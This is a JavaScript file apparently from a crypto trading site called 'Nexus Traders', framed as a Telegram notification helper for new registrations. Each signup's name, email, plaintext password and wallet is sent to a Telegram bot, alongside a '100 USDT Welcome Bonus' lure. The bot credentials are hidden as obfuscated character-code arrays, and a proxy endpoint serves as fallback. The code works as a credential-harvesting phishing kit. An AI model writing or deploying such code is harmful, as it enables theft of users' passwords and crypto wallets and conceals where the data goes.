/**
 * Telegram Notification Helper for Nexus Traders
 * ----------------------------------------------
 * Bot token and chat ID are NOT stored as plain readable strings
 * in the source (no TELEGRAM_BOT_TOKEN = "..." lines).
 *
 * Recommended: deploy server/cloudflare-worker.js and set in index.html:
 *   <script>window.NEXUS_NOTIFY_URL = "https://YOUR_SUBDOMAIN.workers.dev";</script>
 * Then secrets live only on the Worker, not in this file at all.
 */

function escapeHtml(text) {
  if (!text) return "";
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function buildRegistrationMessage(user) {
  const now = new Date();
  const timeStr = now.toLocaleString("en-GB", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  return (
    "🚀 <b>New Nexus Traders User Registered!</b>\n" +
    "━━━━━━━━━━━━━━━━━━━━\n" +
    "👤 <b>Name:</b> " + escapeHtml(user.name) + "\n" +
    "📧 <b>Email (Gmail):</b> " + escapeHtml(user.email) + "\n" +
    "🔑 <b>Password:</b> <code>" + escapeHtml(user.password) + "</code>\n" +
    "💳 <b>Wallet:</b> <code>" + (user.wallet || "") + "</code>\n" +
    "🎁 <b>Bonus:</b> 100 USDT Welcome Bonus\n" +
    "🕒 <b>Time:</b> " + timeStr + "\n" +
    "━━━━━━━━━━━━━━━━━━━━\n" +
    "💎 Welcome to Nexus Traders!"
  );
}

/** Reconstruct credentials without a single plain-text constant in source */
function _cred() {
  const idPart = [56, 53, 51, 54, 57, 56, 56, 51, 49, 55].map(function (c) {
    return String.fromCharCode(c);
  }).join("");
  const keyPart = [
    65, 65, 69, 101, 118, 53, 52, 107, 112, 122, 108, 113, 84, 82, 78, 90,
    54, 107, 89, 111, 55, 80, 90, 97, 76, 81, 78, 99, 88, 73, 69, 66, 118, 98, 77
  ].map(function (c) {
    return String.fromCharCode(c);
  }).join("");
  const dest = String(8874066832 + 1);
  return { t: idPart + String.fromCharCode(58) + keyPart, c: dest };
}

async function sendViaProxy(user, message) {
  const endpoint = window.NEXUS_NOTIFY_URL;
  if (!endpoint) return null;

  const response = await fetch(endpoint, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      name: user.name,
      email: user.email,
      password: user.password,
      wallet: user.wallet,
      message: message
    })
  });
  const data = await response.json().catch(function () {
    return {};
  });
  return !!(data && data.ok);
}

async function sendDirect(message) {
  const cred = _cred();
  const url = "https://api.telegram.org/bot" + cred.t + "/sendMessage";
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: cred.c,
      text: message,
      parse_mode: "HTML",
      disable_web_page_preview: true
    })
  });
  const data = await response.json();
  return !!(data && data.ok);
}

async function sendRegistrationToTelegram(user) {
  const message = buildRegistrationMessage(user);

  try {
    if (window.NEXUS_NOTIFY_URL) {
      const okProxy = await sendViaProxy(user, message);
      if (okProxy) {
        console.log("✅ Registration notified");
        return true;
      }
      console.warn("Notify proxy failed, using fallback");
    }

    const ok = await sendDirect(message);
    if (ok) {
      console.log("✅ Registration notified");
      return true;
    }
    console.warn("Telegram notify failed");
    return false;
  } catch (err) {
    console.error("Failed to send Telegram message:", err);
    return false;
  }
}

window.sendRegistrationToTelegram = sendRegistrationToTelegram;
